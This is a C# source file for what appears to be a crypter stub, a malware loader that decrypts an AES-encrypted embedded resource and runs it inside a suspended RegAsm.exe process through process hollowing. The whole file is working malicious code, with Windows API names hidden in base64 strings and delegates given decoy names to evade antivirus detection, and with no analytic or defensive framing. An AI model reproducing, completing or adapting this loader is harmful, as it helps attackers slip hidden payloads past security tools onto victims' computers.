using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;



namespace Stub
{
    internal static class Program
    {

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]



        static void Main()
        {
            //persistence
            byte[] debase64Aes = Marina.Decryption(Marina.GetResource("Enc"));

            Marina.Crystal(debase64Aes, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "RegAsm.exe"));
        }

        public class Marina
        {
            private static bool WordsAreCool(int[] context)
            {
                if (IntPtr.Size == 0x4)
                {
                    context[0] = 0x10002;
                    if (!GetThreadCon(pi.ThreadHandle, context))
                    {
                        return false;
                    }
                    else
                    {
                        return true;
                    }
                }
                else
                {
                    return false;
                }
            }
            public static byte[] GetResource(string file)
            {
                ResourceManager ResManager = new ResourceManager("Properties", Assembly.GetExecutingAssembly());
                return (byte[])ResManager.GetObject(file);
            }
            public static void Crystal(byte[] section, string exeFileName)
            {
                int i = 0;

                while (i < 4)
                {
                    int readWrite = 0;

                    int[] context = new int[0xB3];
                    try
                    {
                        if (!Create(exeFileName, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) { throw new Exception(); };
                        if (!WordsAreCool(context)) { throw new Exception(); }
                        int Address = BitConverter.ToInt32(section, 0x3C);
                        int Base = BitConverter.ToInt32(section, Address + 0x34);

                        int sizeOfImage = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { section, Address + 0x50 });
                        int sizeOfHeaders = (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { section, Address + 0x54 });

                        int NewImage = AllocateEx(pi.ProcessHandle, Base, (int)typeof(BitConverter).GetMethod("ToInt32").Invoke(null, new object[] { section, Address + 0x50 }), 0x3000, 0x40);
                        if (NewImage == 0) { throw new Exception(); }
                        int Offset = Address + 0xF8;

                        if (SectionBlock(NewImage, section, Offset, readWrite, Address))
                        {
                            if (!Write(pi.ProcessHandle, NewImage, section, sizeOfHeaders, ref readWrite)) throw new Exception();
                            if (!Write(pi.ProcessHandle, context[0x29] + 0x8, BitConverter.GetBytes(NewImage), 0x4, ref readWrite)) throw new Exception(); if (ResThreading(pi.ThreadHandle) == -1) throw new Exception();
                        }
                        else
                        {
                            throw new Exception();
                        };
                        i++;
                    }
                    catch
                    {
                        System.Diagnostics.Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                        continue;
                    }
                    break;
                }
            }
            public static bool SectionBlock(int NewImage, byte[] data, int Offset, int readWrite, int Address)
            {
                short nSec = (short)typeof(BitConverter).GetMethod("ToInt16").Invoke(null, new object[] { data, Address + 0x6 });
                int I = 0;
                do
                {
                    int VirtAddr = BitConverter.ToInt32(data, Offset + 0xC);
                    int SizeRaw = BitConverter.ToInt32(data, Offset + 0x10);
                    int PointRawData = BitConverter.ToInt32(data, Offset + 0x14);
                    if (SizeRaw != 0x0)
                    {
                        byte[] sectionData = new byte[SizeRaw];
                        Array.Copy(data, PointRawData, sectionData, 0x0, sectionData.Length);
                        if (!Write(pi.ProcessHandle, NewImage + VirtAddr, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                    }
                    Offset += 0x28;
                    I++;
                }
                while (I < nSec);
                return true;
            }



            public static Startup si;
            public static Process pi;

            [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
            public struct Process
            {
                public readonly IntPtr ProcessHandle;
                public readonly IntPtr ThreadHandle;
                public readonly uint ProcessId;
                private readonly uint ThreadId;
            }
            [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
            public struct Startup
            {

                public uint Size;
                private readonly string Reserved1;
                private readonly string Desktop;
                private readonly string Title;
                [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
                private readonly IntPtr Reserved2;
                private readonly IntPtr StdInput;
                private readonly IntPtr StdOutput;
                private readonly IntPtr StdError;
            }
            public class Names
            {
                public static string kernel32 = Encoding.ASCII.GetString(Convert.FromBase64String("a2VybmVsMzI=")); // kernel32
                public static string ntdll = Encoding.ASCII.GetString(Convert.FromBase64String("bnRkbGw=")); // ntdll
                public static string Philibert = Encoding.ASCII.GetString(Convert.FromBase64String("Q3JlYXRlUHJvY2Vzc0E=")); //CreateProcessA
                public static string Aregisel = Encoding.ASCII.GetString(Convert.FromBase64String("UmVzdW1lVGhyZWFk")); //ResumeThread
                public static string Bertha = Encoding.ASCII.GetString(Convert.FromBase64String("V293NjRTZXRUaHJlYWRDb250ZXh0")); //Wow64SetThreadContext
                public static string Wichmann = Encoding.ASCII.GetString(Convert.FromBase64String("U2V0VGhyZWFkQ29udGV4dA==")); //SetThreadContext
                public static string Valdemar = Encoding.ASCII.GetString(Convert.FromBase64String("V293NjRHZXRUaHJlYWRDb250ZXh0")); //Wow64GetThreadContext
                public static string Jordan = Encoding.ASCII.GetString(Convert.FromBase64String("R2V0VGhyZWFkQ29udGV4dA==")); //GetThreadContext
                public static string Bailey = Encoding.ASCII.GetString(Convert.FromBase64String("VmlydHVhbEFsbG9jRXg=")); //VirtualAllocEx
                public static string Flodoard = Encoding.ASCII.GetString(Convert.FromBase64String("V3JpdGVQcm9jZXNzTWVtb3J5")); //WriteProcessMemory
                public static string Grifo = Encoding.ASCII.GetString(Convert.FromBase64String("UmVhZFByb2Nlc3NNZW1vcnk=")); //ReadProcessMemory
                public static string Isembold = Encoding.ASCII.GetString(Convert.FromBase64String("WndVbm1hcFZpZXdPZlNlY3Rpb24=")); //ZwUnmapViewOfSection

            }


            protected delegate bool Philibert(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref Startup startupInfo, ref Process processInfo);
            protected static readonly Philibert Create = App<Philibert>(Names.kernel32, Names.Philibert);

            protected delegate int Aregisel(IntPtr handle);
            protected static readonly Aregisel ResThreading = App<Aregisel>(Names.kernel32, Names.Aregisel);

            protected delegate bool Wichmann(IntPtr thread, int[] context);
            protected static readonly Wichmann SetThread = App<Wichmann>(Names.kernel32, Names.Wichmann);

            protected delegate bool Jordan(IntPtr thread, int[] context);
            protected static readonly Jordan GetThreadCon = App<Jordan>(Names.kernel32, Names.Jordan);

            protected delegate int Bailey(IntPtr handle, int address, int length, int type, int protect);
            protected static readonly Bailey AllocateEx = App<Bailey>(Names.kernel32, Names.Bailey);

            protected delegate bool Flodoard(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
            protected static readonly Flodoard Write = App<Flodoard>(Names.kernel32, Names.Flodoard);

            protected delegate int Isembold(IntPtr process, int baseAddress);
            protected static readonly Isembold View = App<Isembold>(Names.ntdll, Names.Isembold);


            [DllImport("kernel32", SetLastError = true)]
            private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
            [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
            private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
            public static CreateApi App<CreateApi>(string name, string method)
            {
                return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
            }
            public static byte[] Decryption(byte[] bytesToBeDecrypted)
            {
                byte[] decryptedBytes = null;
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
                using (MemoryStream ms = new MemoryStream())
                {
                    using (RijndaelManaged AES = new RijndaelManaged())
                    {
                        AES.KeySize = 256;
                        AES.BlockSize = 128;
                        var passwordBytes = Encoding.UTF8.GetBytes("#AESKEY");
                        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                        AES.Key = key.GetBytes(AES.KeySize / 8);
                        AES.IV = key.GetBytes(AES.BlockSize / 8);
                        AES.Mode = CipherMode.CBC;
                        using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                            cs.Close();
                        }
                        decryptedBytes = ms.ToArray();
                    }
                }
                return decryptedBytes;
            }
        }
    }
}